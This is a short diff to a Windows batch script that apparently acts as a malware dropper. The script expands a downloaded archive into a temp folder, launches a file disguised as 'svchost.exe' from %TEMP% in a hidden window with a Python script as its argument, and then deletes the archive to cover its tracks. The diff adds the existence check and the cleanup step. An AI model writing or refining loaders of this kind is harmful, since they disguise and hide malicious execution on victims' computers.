@@ -16,6 +16,13 @@ for %%A in ("%output%") do (
 
 powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"
 
-powershell -Command "Start-Process -FilePath "$env:TEMP\svchost.exe" -ArgumentList "`"$env:TEMP\python.py`"" -WindowStyle Hidden"
+set "pythonScript=%tempdir%\python.py"
+if exist "%pythonScript%" (
+    powershell -Command "Start-Process -FilePath "$env:TEMP\svchost.exe" -ArgumentList "`"$env:TEMP\python.py`"" -WindowStyle Hidden"
+) else (
+    exit
+)
+
+del "%output%"
 
 exit
